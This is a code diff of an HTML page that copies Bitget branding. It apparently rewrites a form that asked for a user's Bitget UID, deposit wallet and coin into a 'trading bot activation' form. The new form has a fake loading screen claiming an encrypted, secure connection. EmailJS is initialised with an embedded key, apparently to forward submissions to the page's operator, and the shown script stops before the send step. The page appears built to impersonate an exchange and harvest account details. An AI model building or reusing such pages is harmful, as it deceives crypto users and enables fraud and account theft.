@@ -1,452 +1,3230 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BITGET WEB3 TRADING</title>
-  <!-- EMAILJS -->
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-</head>
-<body>
 
-<div class="container" id="formContainer">
-  <h2>Please fill in your Bitget's<br>user details here</h2>
-  <a class="help-link">need help?</a>
+<head>
+
+<meta charset="UTF-8">
+
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1.0"
+>
+
+<title>BITGET WEB3 TRADING</title>
+
+
+<!-- EMAILJS -->
+
+<script
+  type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+
+</head>
+
+
+<body id="put1">
+
+
+<!-- =====================================================
+     MAIN FORM
+===================================================== -->
+
+<div
+  class="container"
+  id="formContainer"
+>
+
+  <h2>
+    Please fill in your Bitget's<br>
+    user details here
+  </h2>
+
+
+  <a
+    href="help.html"
+    class="help-link"
+  >
+    need help?
+  </a>
+
 
   <form id="page3Form">
-    <div class="form-group">
-      <label>* UID:</label>
-      <input type="text" id="uid" name="uid" placeholder="User Identity">
-    </div>
+
+
+    <!-- UID -->
 
     <div class="form-group">
-      <label>* Wallet:</label>
-      <input type="text" id="wallet" name="wallet" placeholder="Deposit Address">
+
+      <label>
+        Bitget's UID:
+      </label>
+
+      <input
+        type="text"
+        id="uid"
+        name="uid"
+        placeholder="User Identity"
+      >
+
     </div>
 
+
+
+    <!-- =================================================
+         PLAN DROPDOWN
+    ================================================== -->
+
     <div class="form-group">
-      <label>* Crypto:</label>
-      <input type="text" id="crypto" name="crypto" placeholder="select crypto type">
+
+      <label>
+        Plan:
+      </label>
+
+
+      <div class="plan-dropdown-wrapper">
+
+
+        <input
+          type="text"
+          id="wallet"
+          name="wallet"
+          placeholder=" plan"
+          readonly
+        >
+
+
+        <!-- DARK GREY ARROW -->
+
+        <span class="plan-dropdown-arrow">
+          ▼
+        </span>
+
+
+        <!-- PLAN DROPDOWN LIST -->
+
+        <div class="plan-dropdown-list">
+
+
+          <div class="plan-dropdown-option">
+            short term
+          </div>
+
+
+          <div class="plan-dropdown-option">
+            long term
+          </div>
+
+
+        </div>
+
+
+      </div>
+
     </div>
+
+
+
+    <!-- GRID LEVEL -->
+
+    <div class="form-group">
+
+      <label>
+        Grid levels :
+      </label>
+
+
+      <input
+        type="text"
+        id="crypto"
+        name="crypto"
+        placeholder="grid level"
+      >
+
+    </div>
+
+
+
+    <!-- INFO -->
 
     <p class="info-text">
-      please ensure your UID, Wallet,<br>
-      and memo are correct before submission.
+
+      please ensure setup certainty<br>
+
+      before activating bot.
+
     </p>
+
+
 
     <p class="warning-text">
-      Are you certain you've provided the<br>
-      correct details?
+
+      Are you certain with the provided setup?
+
+      <br>
+
     </p>
 
+
+
+    <!-- CHECKBOX -->
+
     <div class="checkbox-wrapper">
-      <label>Yes I attest =></label>
-      <input type="checkbox" id="attest">
+
+      <label>
+        confirm setup=>
+      </label>
+
+
+      <input
+        type="checkbox"
+        id="attest"
+      >
+
     </div>
 
-    <button type="submit" class="submit-btn">Submit</button>
+
+
+    <!-- SUBMIT -->
+
+    <button
+      type="submit"
+      class="submit-btn"
+    >
+
+      Activate bot
+
+    </button>
+
+
   </form>
+
 </div>
 
-<!-- SUCCESS MESSAGE CONTAINER - HIDDEN BY DEFAULT -->
-<div class="success-container" id="successContainer" style="display: none;">
-  <h3>Registration Successful</h3>
+
+
+<!-- =====================================================
+     SUCCESS MESSAGE
+===================================================== -->
+
+<div
+  class="success-container"
+  id="successContainer"
+  style="display: none;"
+>
+
+
+  <h3>
+    Activation Successful
+  </h3>
+
+
   <p>
-    Your details have been received and your registration has been completed successfully. 
-    You will receive further updates via email regarding the progress of your registration.
+
+    Your bot has been successfully activated
+    and your setup details have been received.
+
   </p>
+
+
   <p>
-    Please check your email for further instructions and the necessary steps towards the commencement of your trading activities.
+
+    Further notifications, updates, and instructions
+    regarding your bot activation will be sent to
+    your registered email address.
+
   </p>
-  <button type="button" class="ok-btn" id="okBtn">OK</button>
+
+
+  <p>
+
+    Please check your email regularly for the next steps.
+
+  </p>
+
+
+  <button
+    type="button"
+    class="ok-btn"
+    id="okBtn"
+  >
+
+    OK
+
+  </button>
+
+
 </div>
+
+
+
+<!-- =====================================================
+     CUSTOM EMPTY FORM ALERT
+===================================================== -->
+
+<div
+  class="custom-alert"
+  id="emptyFormAlert"
+>
+
+
+  <div class="custom-alert-box">
+
+
+    <p>
+      pls complete bot setup
+    </p>
+
+
+    <button
+      type="button"
+      id="emptyFormOk"
+    >
+
+      OK
+
+    </button>
+
+
+  </div>
+
+
+</div>
+
+
+
+<!-- =====================================================
+     ROBOTIC LOADING OVERLAY
+===================================================== -->
+
+<div
+  id="botLoaderOverlay"
+  class="bot-loader-overlay"
+  style="display: none;"
+>
+
+
+  <!-- BACKGROUND -->
+
+  <div class="loader-background">
+
+    <div class="loader-grid"></div>
+
+    <div class="loader-scan-line"></div>
+
+  </div>
+
+
+
+  <!-- CENTERED LOADER -->
+
+  <main class="loader-container">
+
+
+    <div class="system-label">
+      BOT // SYSTEM
+    </div>
+
+
+    <div class="loader-title">
+      ACTIVATING BOT
+    </div>
+
+
+    <div class="loader-subtitle">
+      AUTOMATED TRADING CORE
+    </div>
+
+
+
+    <!-- ROBOTIC CORE -->
+
+    <div class="core">
+
+
+      <div class="ring ring-one"></div>
+
+      <div class="ring ring-two"></div>
+
+      <div class="ring ring-three"></div>
+
+
+      <div class="robot">
+
+
+        <div class="eyes">
+
+          <div class="eye"></div>
+
+          <div class="eye"></div>
+
+        </div>
+
+
+        <div class="mouth"></div>
+
+
+      </div>
+
+
+    </div>
+
+
+
+    <!-- PROGRESS -->
+
+    <div class="progress-section">
+
+
+      <div class="progress-info">
+
+        <span>
+          LOADING
+        </span>
+
+
+        <span id="loaderPercentage">
+          0%
+        </span>
+
+      </div>
+
+
+
+      <div class="progress-bar">
+
+        <div
+          class="progress-fill"
+          id="loaderProgressFill"
+        ></div>
+
+      </div>
+
+
+    </div>
+
+
+
+    <!-- STATUS -->
+
+    <div
+      class="status"
+      id="loaderStatus"
+    >
+
+      Establishing secure connection
+
+    </div>
+
+
+
+    <!-- SYSTEM INFO -->
+
+    <div class="system-code">
+
+      SYSTEM ID: BOT-TRD-01<br>
+
+      SECURITY: ACTIVE<br>
+
+      CONNECTION: ENCRYPTED
+
+    </div>
+
+
+  </main>
+
+
+</div>
+
+
 
 <style>
-  /* ===== RESET & BASE ===== */
+
+
+/* =====================================================
+   RESET
+===================================================== */
+
 * {
+
   margin: 0;
+
   padding: 0;
+
   box-sizing: border-box;
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+
+  font-family:
+    -apple-system,
+    BlinkMacSystemFont,
+    "Segoe UI",
+    Roboto,
+    Arial,
+    sans-serif;
+
 }
+
+
+
+#put1 {
+
+  background-color: black;
+
+}
+
+
 
 body {
+
   background: #f2f2f2;
+
   display: flex;
+
   justify-content: center;
+
   align-items: center;
+
   min-height: 100vh;
+
   padding: 20px;
+
 }
 
-/* ===== CARD CONTAINER ===== */
+
+
+/* =====================================================
+   CARD
+===================================================== */
+
 .container {
-  background: #fff;
+
+  background: black;
+
   width: 100%;
+
   max-width: 400px;
+
   border-radius: 20px;
+
   padding: 25px 20px 30px 20px;
-  box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+
+  box-shadow:
+    0 2px 10px
+    rgba(0,0,0,0.05);
+
 }
 
-/* ===== SUCCESS CONTAINER ===== */
+
+
+/* =====================================================
+   SUCCESS
+===================================================== */
+
 .success-container {
-  background: #fff;
+
+  background: darkgray;
+
   width: 100%;
+
   max-width: 400px;
+
   border-radius: 16px;
+
   border: 1px solid #e0e0e0;
+
   padding: 30px 25px;
-  box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+
+  box-shadow:
+    0 2px 10px
+    rgba(0,0,0,0.05);
+
   text-align: center;
-  animation: fadeIn 0.4s ease-in;
+
+  animation:
+    fadeIn 0.4s ease-in;
+
 }
+
+
 
 .success-container h3 {
-  color: #00bcd4;
+
+  color: white;
+
   font-size: 22px;
+
   font-weight: 700;
+
   margin-bottom: 15px;
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+
 }
+
+
 
 .success-container p {
+
   color: #333;
+
   font-size: 15px;
+
   line-height: 1.6;
+
   margin-bottom: 12px;
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+
 }
 
-/* ===== OK BUTTON ===== */
+
+
 .ok-btn {
+
   width: 100%;
+
   padding: 14px;
-  background: #00bcd4;
+
+  background: black;
+
   color: #fff;
+
   border: none;
+
   border-radius: 12px;
+
   font-size: 16px;
+
   font-weight: bold;
+
   cursor: pointer;
-  transition: background 0.2s;
+
+  transition:
+    background 0.2s;
+
   margin-top: 15px;
+
 }
+
+
 
 .ok-btn:hover {
-  background: #00a5bb;
+
+  background: black;
+
 }
+
+
 
 .ok-btn:active {
+
   transform: scale(0.98);
+
 }
+
+
 
 @keyframes fadeIn {
-  from { opacity: 0; transform: translateY(10px); }
-  to { opacity: 1; transform: translateY(0); }
+
+  from {
+
+    opacity: 0;
+
+    transform:
+      translateY(10px);
+
+  }
+
+  to {
+
+    opacity: 1;
+
+    transform:
+      translateY(0);
+
+  }
+
 }
 
-/* ===== HEADER ===== */
+
+
+/* =====================================================
+   HEADER
+===================================================== */
+
 .container h2 {
-  color: #00bcd4; /* Bitget blue */
+
+  color: #00bcd4;
+
   font-size: 20px;
+
   font-weight: 700;
+
   text-align: center;
+
   line-height: 1.4;
+
   margin-bottom: 5px;
+
 }
+
+
 
 .help-link {
+
   display: block;
+
   text-align: right;
+
   font-size: 14px;
+
   color: #00bcd4;
+
   text-decoration: underline;
+
   margin-bottom: 15px;
+
   cursor: pointer;
+
 }
 
-/* ===== FORM FIELDS ===== */
+
+
+/* =====================================================
+   FORM
+===================================================== */
+
 .form-group {
+
   margin-bottom: 15px;
+
 }
+
+
 
 .form-group label {
+
   display: block;
-  color: red;
+
+  color: white;
+
   font-weight: bold;
+
   font-size: 14px;
+
   margin-bottom: 6px;
+
 }
+
+
 
 .form-group input {
+
   width: 100%;
+
   padding: 12px 14px;
+
   border: 1px solid #e0e0e0;
+
   border-radius: 10px;
+
   background: #f5f5f5;
+
   font-size: 15px;
+
   color: #333;
+
   outline: none;
+
 }
+
+
 
 .form-group input::placeholder {
+
   color: #999;
+
 }
+
+
 
 .form-group input:focus {
+
   border-color: #00bcd4;
-  background: #fff;
+
+  background: white;
+
 }
 
-/* ===== INFO TEXT ===== */
-.info-text {
-  text-align: center;
-  font-size: 13px;
-  color: #333;
-  line-height: 1.5;
-  margin: 20px 0 10px 0;
+
+
+/* =====================================================
+   PLAN DROPDOWN
+===================================================== */
+
+.plan-dropdown-wrapper {
+
+  position: relative;
+
+  width: 100%;
+
 }
+
+
+
+.plan-dropdown-wrapper input {
+
+  width: 100%;
+
+  padding-right: 40px;
+
+  cursor: pointer;
+
+}
+
+
+
+.plan-dropdown-arrow {
+
+  position: absolute;
+
+  right: 14px;
+
+  top: 50%;
+
+  transform:
+    translateY(-50%);
+
+  color: #555555;
+
+  font-size: 13px;
+
+  pointer-events: none;
+
+  transition:
+    transform 0.2s ease;
+
+}
+
+
+
+.plan-dropdown-wrapper.open
+.plan-dropdown-arrow {
+
+  transform:
+    translateY(-50%)
+    rotate(180deg);
+
+}
+
+
+
+.plan-dropdown-list {
+
+  display: none;
+
+  position: absolute;
+
+  left: 0;
+
+  top:
+    calc(100% + 4px);
+
+  width: 50%;
+
+  background: #164d3b;
+
+  color: white;
+
+  border-radius: 8px;
+
+  overflow: hidden;
+
+  z-index: 10000;
+
+  box-shadow:
+    0 5px 15px
+    rgba(0,0,0,0.35);
+
+}
+
+
+
+.plan-dropdown-wrapper.open
+.plan-dropdown-list {
+
+  display: block;
+
+}
+
+
+
+.plan-dropdown-option {
+
+  padding: 10px 12px;
+
+  color: white;
+
+  font-size: 13px;
+
+  cursor: pointer;
+
+  border-bottom:
+    1px solid
+    rgba(255,255,255,0.08);
+
+}
+
+
+
+.plan-dropdown-option:last-child {
+
+  border-bottom: none;
+
+}
+
+
+
+.plan-dropdown-option:hover {
+
+  background: #1d624b;
+
+}
+
+
+
+.plan-dropdown-option:active {
+
+  background: #24765a;
+
+}
+
+
+
+/* =====================================================
+   INFO
+===================================================== */
+
+.info-text {
+
+  text-align: center;
+
+  font-size: 13px;
+
+  color: darkgray;
+
+  line-height: 1.5;
+
+  margin:
+    20px 0 10px 0;
+
+}
+
+
 
 .warning-text {
+
   text-align: center;
+
   font-size: 14px;
+
   color: red;
+
   font-weight: bold;
+
   line-height: 1.4;
+
   margin-bottom: 15px;
+
 }
 
-/* ===== CHECKBOX ===== */
+
+
+/* =====================================================
+   CHECKBOX
+===================================================== */
+
 .checkbox-wrapper {
+
   display: flex;
+
   justify-content: center;
+
   align-items: center;
+
   gap: 8px;
+
   margin-bottom: 20px;
+
 }
+
+
 
 .checkbox-wrapper label {
+
   color: green;
+
   font-weight: bold;
+
   font-size: 14px;
+
 }
+
+
 
 .checkbox-wrapper input[type="checkbox"] {
+
   width: 18px;
+
   height: 18px;
+
   accent-color: #00bcd4;
+
   cursor: pointer;
+
 }
 
-/* ===== BUTTON ===== */
+
+
+/* =====================================================
+   SUBMIT
+===================================================== */
+
 .submit-btn {
+
   width: 100%;
+
   padding: 14px;
-  background: #00bcd4; /* Bitget blue */
-  color: #fff;
+
+  background: #00bcd4;
+
+  color: black;
+
   border: none;
+
   border-radius: 12px;
+
   font-size: 16px;
+
   font-weight: bold;
+
   cursor: pointer;
-  transition: background 0.2s;
+
+  transition:
+    background 0.2s;
+
 }
+
+
 
 .submit-btn:hover {
+
   background: #00a5bb;
+
 }
+
+
 
 .submit-btn:active {
+
   transform: scale(0.98);
+
 }
+
+
+
+/* =====================================================
+   EMPTY ALERT
+===================================================== */
+
+.custom-alert {
+
+  display: none;
+
+  position: fixed;
+
+  top: 0;
+
+  left: 0;
+
+  width: 100%;
+
+  height: 100%;
+
+  background:
+    rgba(0,0,0,0.45);
+
+  justify-content: center;
+
+  align-items: center;
+
+  z-index: 10000;
+
+  padding: 20px;
+
+}
+
+
+
+.custom-alert.show {
+
+  display: flex;
+
+}
+
+
+
+.custom-alert-box {
+
+  width: 100%;
+
+  max-width: 340px;
+
+  background: darkgray;
+
+  border-radius: 18px;
+
+  padding:
+    25px 20px 20px;
+
+  text-align: center;
+
+  box-shadow:
+    0 10px 35px
+    rgba(0,0,0,0.25);
+
+  animation:
+    alertPopup
+    0.25s
+    ease-out;
+
+}
+
+
+
+.custom-alert-box p {
+
+  margin:
+    0 0 25px;
+
+  color: #222;
+
+  font-size: 16px;
+
+  font-weight: 500;
+
+  line-height: 1.5;
+
+}
+
+
+
+.custom-alert-box button {
+
+  width: 100%;
+
+  padding: 13px;
+
+  border: none;
+
+  border-radius: 10px;
+
+  background: #00bcd4;
+
+  color: #ffffff;
+
+  font-size: 16px;
+
+  font-weight: bold;
+
+  cursor: pointer;
+
+}
+
+
+
+.custom-alert-box button:hover {
+
+  background: #00a5bb;
+
+}
+
+
+
+.custom-alert-box button:active {
+
+  transform:
+    scale(0.98);
+
+}
+
+
+
+@keyframes alertPopup {
+
+  from {
+
+    opacity: 0;
+
+    transform:
+      scale(0.85);
+
+  }
+
+  to {
+
+    opacity: 1;
+
+    transform:
+      scale(1);
+
+  }
+
+}
+
+
+
+/* =====================================================
+   ROBOT LOADER OVERLAY
+===================================================== */
+
+.bot-loader-overlay {
+
+  position: fixed;
+
+  inset: 0;
+
+  width: 100%;
+
+  height: 100%;
+
+  display: flex;
+
+  justify-content: center;
+
+  align-items: center;
+
+  background: #05080d;
+
+  color: #00f6ff;
+
+  font-family:
+    "Courier New",
+    monospace;
+
+  overflow: hidden;
+
+  z-index: 50000;
+
+}
+
+
+
+/* =====================================================
+   LOADER BACKGROUND
+===================================================== */
+
+.loader-background {
+
+  position: fixed;
+
+  inset: 0;
+
+  overflow: hidden;
+
+  z-index: 0;
+
+}
+
+
+
+.loader-grid {
+
+  position: absolute;
+
+  width: 200%;
+
+  height: 200%;
+
+  left: -50%;
+
+  top: -50%;
+
+  background-image:
+
+    linear-gradient(
+      rgba(0,246,255,0.035)
+      1px,
+      transparent 1px
+    ),
+
+    linear-gradient(
+      90deg,
+      rgba(0,246,255,0.035)
+      1px,
+      transparent 1px
+    );
+
+  background-size:
+    45px 45px;
+
+  transform:
+    perspective(500px)
+    rotateX(60deg);
+
+  animation:
+    loaderGridMove
+    8s linear infinite;
+
+}
+
+
+
+@keyframes loaderGridMove {
+
+  from {
+
+    transform:
+      perspective(500px)
+      rotateX(60deg)
+      translateY(0);
+
+  }
+
+  to {
+
+    transform:
+      perspective(500px)
+      rotateX(60deg)
+      translateY(45px);
+
+  }
+
+}
+
+
+
+/* =====================================================
+   SCAN LINE
+===================================================== */
+
+.loader-scan-line {
+
+  position: absolute;
+
+  left: 0;
+
+  width: 100%;
+
+  height: 2px;
+
+  background:
+    rgba(0,246,255,0.25);
+
+  box-shadow:
+    0 0 12px #00f6ff;
+
+  animation:
+    loaderScan
+    4s linear infinite;
+
+}
+
+
+
+@keyframes loaderScan {
+
+  0% {
+
+    top: -5%;
+
+  }
+
+  100% {
+
+    top: 105%;
+
+  }
+
+}
+
+
+
+/* =====================================================
+   LOADER CONTAINER
+===================================================== */
+
+.loader-container {
+
+  width: 340px;
+
+  max-width: 88%;
+
+  padding:
+    26px 22px;
+
+  text-align: center;
+
+  position: relative;
+
+  background:
+    rgba(3,10,16,0.94);
+
+  border:
+    1px solid
+    rgba(0,246,255,0.45);
+
+  border-radius: 18px;
+
+  box-shadow:
+
+    0 0 20px
+    rgba(0,246,255,0.08),
+
+    inset 0 0 25px
+    rgba(0,246,255,0.035);
+
+  z-index: 2;
+
+}
+
+
+
+.loader-container::before,
+.loader-container::after {
+
+  content: "";
+
+  position: absolute;
+
+  width: 25px;
+
+  height: 25px;
+
+  border-color:
+    #00f6ff;
+
+  border-style: solid;
+
+  opacity: 0.65;
+
+}
+
+
+
+.loader-container::before {
+
+  top: 8px;
+
+  left: 8px;
+
+  border-width:
+    1px 0 0 1px;
+
+}
+
+
+
+.loader-container::after {
+
+  bottom: 8px;
+
+  right: 8px;
+
+  border-width:
+    0 1px 1px 0;
+
+}
+
+
+
+/* =====================================================
+   LOADER TEXT
+===================================================== */
+
+.system-label {
+
+  font-size: 9px;
+
+  letter-spacing: 3px;
+
+  opacity: 0.6;
+
+  margin-bottom: 12px;
+
+}
+
+
+
+.loader-title {
+
+  font-size: 18px;
+
+  letter-spacing: 3px;
+
+  font-weight: bold;
+
+  margin-bottom: 5px;
+
+  text-shadow:
+
+    0 0 5px #00f6ff,
+
+    0 0 15px #00f6ff;
+
+}
+
+
+
+.loader-subtitle {
+
+  font-size: 9px;
+
+  letter-spacing: 1.5px;
+
+  opacity: 0.55;
+
+  margin-bottom: 22px;
+
+}
+
+
+
+/* =====================================================
+   ROBOT CORE
+===================================================== */
+
+.core {
+
+  width: 135px;
+
+  height: 135px;
+
+  margin:
+    0 auto 22px;
+
+  position: relative;
+
+  display: flex;
+
+  justify-content: center;
+
+  align-items: center;
+
+}
+
+
+
+.ring {
+
+  position: absolute;
+
+  border:
+    1px solid
+    #00f6ff;
+
+  border-radius: 50%;
+
+}
+
+
+
+.ring-one {
+
+  width: 135px;
+
+  height: 135px;
+
+  opacity: 0.25;
+
+  animation:
+    rotate
+    6s linear infinite;
+
+}
+
+
+
+.ring-two {
+
+  width: 110px;
+
+  height: 110px;
+
+  border-style:
+    dashed;
+
+  opacity: 0.55;
+
+  animation:
+    rotateReverse
+    4s linear infinite;
+
+}
+
+
+
+.ring-three {
+
+  width: 85px;
+
+  height: 85px;
+
+  opacity: 0.8;
+
+  animation:
+    pulse
+    2s ease-in-out infinite;
+
+}
+
+
+
+@keyframes rotate {
+
+  from {
+
+    transform:
+      rotate(0deg);
+
+  }
+
+  to {
+
+    transform:
+      rotate(360deg);
+
+  }
+
+}
+
+
+
+@keyframes rotateReverse {
+
+  from {
+
+    transform:
+      rotate(360deg);
+
+  }
+
+  to {
+
+    transform:
+      rotate(0deg);
+
+  }
+
+}
+
+
+
+@keyframes pulse {
+
+  0%,
+  100% {
+
+    transform:
+      scale(1);
+
+    box-shadow:
+      0 0 8px
+      rgba(0,246,255,0.2);
+
+  }
+
+  50% {
+
+    transform:
+      scale(1.08);
+
+    box-shadow:
+      0 0 25px
+      rgba(0,246,255,0.45);
+
+  }
+
+}
+
+
+
+/* =====================================================
+   ROBOT
+===================================================== */
+
+.robot {
+
+  width: 58px;
+
+  height: 48px;
+
+  border:
+    2px solid
+    #00f6ff;
+
+  border-radius: 12px;
+
+  position: relative;
+
+  box-shadow:
+
+    0 0 8px #00f6ff,
+
+    inset 0 0 12px
+    rgba(0,246,255,0.2);
+
+}
+
+
+
+.robot::before {
+
+  content: "";
+
+  position: absolute;
+
+  width: 4px;
+
+  height: 9px;
+
+  background:
+    #00f6ff;
+
+  left: 50%;
+
+  top: -11px;
+
+  transform:
+    translateX(-50%);
+
+  box-shadow:
+    0 0 7px #00f6ff;
+
+}
+
+
+
+.robot::after {
+
+  content: "";
+
+  position: absolute;
+
+  width: 7px;
+
+  height: 7px;
+
+  border:
+    2px solid
+    #00f6ff;
+
+  border-radius: 50%;
+
+  left: 50%;
+
+  top: -18px;
+
+  transform:
+    translateX(-50%);
+
+  box-shadow:
+    0 0 8px #00f6ff;
+
+}
+
+
+
+.eyes {
+
+  display: flex;
+
+  justify-content:
+    space-between;
+
+  padding:
+    13px 11px 0;
+
+}
+
+
+
+.eye {
+
+  width: 9px;
+
+  height: 6px;
+
+  background:
+    #00f6ff;
+
+  box-shadow:
+    0 0 8px #00f6ff;
+
+  animation:
+    blink
+    3s infinite;
+
+}
+
+
+
+@keyframes blink {
+
+  0%,
+  45%,
+  50%,
+  100% {
+
+    opacity: 1;
+
+  }
+
+  47% {
+
+    opacity: 0;
+
+  }
+
+}
+
+
+
+.mouth {
+
+  position: absolute;
+
+  width: 25px;
+
+  height: 2px;
+
+  background:
+    #00f6ff;
+
+  bottom: 9px;
+
+  left: 50%;
+
+  transform:
+    translateX(-50%);
+
+  box-shadow:
+    0 0 7px #00f6ff;
+
+}
+
+
+
+/* =====================================================
+   PROGRESS
+===================================================== */
+
+.progress-section {
+
+  width: 100%;
+
+}
+
+
+
+.progress-info {
+
+  display: flex;
+
+  justify-content:
+    space-between;
+
+  font-size: 9px;
+
+  letter-spacing: 1.5px;
+
+  margin-bottom: 7px;
+
+}
+
+
+
+.progress-bar {
+
+  width: 100%;
+
+  height: 4px;
+
+  background:
+    rgba(0,246,255,0.08);
+
+  border:
+    1px solid
+    rgba(0,246,255,0.3);
+
+  overflow: hidden;
+
+}
+
+
+
+.progress-fill {
+
+  width: 0%;
+
+  height: 100%;
+
+  background:
+    #00f6ff;
+
+  box-shadow:
+
+    0 0 7px #00f6ff,
+
+    0 0 15px #00f6ff;
+
+  transition:
+    width 0.07s linear;
+
+}
+
+
+
+/* =====================================================
+   STATUS
+===================================================== */
+
+.status {
+
+  margin-top: 17px;
+
+  min-height: 15px;
+
+  font-size: 9px;
+
+  letter-spacing: 1px;
+
+  opacity: 0.75;
+
+}
+
+
+
+.status::before {
+
+  content:
+    "[ ";
+
+}
+
+
+
+.status::after {
+
+  content:
+    " ]";
+
+}
+
+
+
+/* =====================================================
+   SYSTEM INFO
+===================================================== */
+
+.system-code {
+
+  margin-top: 13px;
+
+  font-size: 7px;
+
+  letter-spacing: 1.5px;
+
+  opacity: 0.3;
+
+  line-height: 1.7;
+
+}
+
+
+
+/* =====================================================
+   MOBILE
+===================================================== */
+
+@media (max-width: 400px) {
+
+  .loader-container {
+
+    width: 320px;
+
+    padding:
+      23px 18px;
+
+  }
+
+
+  .loader-title {
+
+    font-size: 16px;
+
+  }
+
+}
+
 </style>
+
+
+
 <script>
-(function(){ 
-  emailjs.init("trKd_qkfAMWqGxcTW"); 
+
+
+/* =====================================================
+   EMAILJS INITIALIZATION
+===================================================== */
+
+(function() {
+
+  emailjs.init(
+    "trKd_qkfAMWqGxcTW"
+  );
+
 })();
 
-document.addEventListener('DOMContentLoaded', function() {
-  const form = document.getElementById('page3Form');
-  const formContainer = document.getElementById('formContainer');
-  const successContainer = document.getElementById('successContainer');
-  const okBtn = document.getElementById('okBtn');
-  const checkbox = document.getElementById('attest');
-  const submitBtn = document.querySelector('.submit-btn');
-  
-  // Get inputs safely
-  const uidInput = document.getElementById('uid');
-  const walletInput = document.getElementById('wallet');
-  const cryptoInput = document.getElementById('crypto');
-  
-  const inputs = [
-    {el: uidInput},
-    {el: walletInput},
-    {el: cryptoInput}
-  ].filter(item => item.el);
 
-  // 1. WRAP CRYPTO INPUT WITH DROPDOWN
-  if(cryptoInput) {
-    const cryptoWrapper = document.createElement('div');
-    cryptoWrapper.style.position = 'relative';
-    cryptoInput.parentNode.insertBefore(cryptoWrapper, cryptoInput);
-    cryptoWrapper.appendChild(cryptoInput);
-    
-    const arrow = document.createElement('span');
-    arrow.innerHTML = '▼';
-    arrow.style.position = 'absolute';
-    arrow.style.right = '12px';
-    arrow.style.top = '50%';
-    arrow.style.transform = 'translateY(-50%)';
-    arrow.style.pointerEvents = 'none';
-    arrow.style.color = '#999';
-    arrow.style.fontSize = '12px';
-    cryptoWrapper.appendChild(arrow);
 
-    const cryptoList = ['BTC', 'BGB', 'ETH', 'USDT', 'BNB', 'SOL', 'XRP', 'DOGE', 'TRX', 'TON'];
-    const dropdown = document.createElement('ul');
-    dropdown.style.cssText = `position:absolute;top:100%;left:0;right:0;background:#fff;border:1px solid #ddd;border-radius:8px;max-height:200px;overflow-y:auto;z-index:999;list-style:none;padding:5px 0;margin-top:5px;box-shadow:0 4px 10px rgba(0,0,0,0.1);display:none;`;
-    cryptoWrapper.appendChild(dropdown);
+document.addEventListener(
+  'DOMContentLoaded',
+  function() {
 
-    cryptoList.forEach(coin => {
-      const li = document.createElement('li');
-      li.textContent = coin;
-      li.style.cssText = `padding:10px 14px;cursor:pointer;font-size:14px;`;
-      li.onmouseover = () => li.style.background = '#f5f5f5';
-      li.onmouseout = () => li.style.background = '#fff';
-      li.onclick = () => {
-        cryptoInput.value = coin;
-        dropdown.style.display = 'none';
-        arrow.innerHTML = '▼';
-        validateField({el: cryptoInput, label: cryptoInput.previousElementSibling, originalLabel: cryptoInput.previousElementSibling?.textContent});
-      };
-      dropdown.appendChild(li);
-    });
 
-    cryptoInput.addEventListener('focus', () => { dropdown.style.display = 'block'; arrow.innerHTML = '▲'; });
-    document.addEventListener('click', (e) => {
-      if(!cryptoWrapper.contains(e.target)) { dropdown.style.display = 'none'; arrow.innerHTML = '▼'; }
-    });
-  }
+    /* =================================================
+       ELEMENTS
+    ================================================= */
 
-  // 2. SETUP LABELS + ERROR SPANS SAFELY
-  inputs.forEach(item => {
-    const label = item.el.previousElementSibling;
-    if(!label) return;
-    item.label = label;
-    item.originalLabel = label.textContent;
-    
-    const errorSpan = document.createElement('span');
-    errorSpan.className = 'js-error';
-    errorSpan.style.cssText = `color:red;font-size:12px;margin-right:5px;opacity:0;transition:opacity 0.3s ease-in;`;
-    label.prepend(errorSpan);
-    item.errorEl = errorSpan;
-  });
+    const form =
+      document.getElementById(
+        'page3Form'
+      );
 
-  // 3. CHECKBOX ERROR WITH SPACE
-  if(checkbox) {
-    const checkboxContainer = checkbox.parentElement;
-    const checkboxError = document.createElement('div');
-    checkboxError.className = 'js-checkbox-error';
-    checkboxError.style.cssText = `color:red;font-size:13px;text-align:center;margin-top:5px;margin-bottom:15px;opacity:0;transition:opacity 0.3s ease-in;`;
-    checkboxContainer.after(checkboxError);
+
+    const formContainer =
+      document.getElementById(
+        'formContainer'
+      );
+
+
+    const successContainer =
+      document.getElementById(
+        'successContainer'
+      );
+
+
+    const okBtn =
+      document.getElementById(
+        'okBtn'
+      );
+
+
+    const checkbox =
+      document.getElementById(
+        'attest'
+      );
+
+
+    const submitBtn =
+      document.querySelector(
+        '.submit-btn'
+      );
+
+
+
+    /* =================================================
+       ROBOT LOADER ELEMENTS
+    ================================================= */
+
+    const botLoaderOverlay =
+      document.getElementById(
+        'botLoaderOverlay'
+      );
+
+
+    const loaderPercentage =
+      document.getElementById(
+        'loaderPercentage'
+      );
+
+
+    const loaderProgressFill =
+      document.getElementById(
+        'loaderProgressFill'
+      );
+
+
+    const loaderStatus =
+      document.getElementById(
+        'loaderStatus'
+      );
+
+
+
+    /* =================================================
+       PLAN DROPDOWN
+    ================================================= */
+
+    const planWrapper =
+      document.querySelector(
+        '.plan-dropdown-wrapper'
+      );
+
+
+    const planInput =
+      document.getElementById(
+        'wallet'
+      );
+
+
+    const planOptions =
+      document.querySelectorAll(
+        '.plan-dropdown-option'
+      );
+
+
+
+    planInput.addEventListener(
+      'click',
+      function(event) {
+
+        event.stopPropagation();
+
+        planWrapper.classList.toggle(
+          'open'
+        );
+
+      }
+    );
+
+
+
+    /* =================================================
+       CUSTOM ALERT
+    ================================================= */
+
+    const emptyFormAlert =
+      document.getElementById(
+        'emptyFormAlert'
+      );
+
+
+    const emptyFormOk =
+      document.getElementById(
+        'emptyFormOk'
+      );
+
+
+    emptyFormOk.addEventListener(
+      'click',
+      function() {
+
+        emptyFormAlert.classList.remove(
+          'show'
+        );
+
+      }
+    );
+
+
+
+    /* =================================================
+       INPUTS
+    ================================================= */
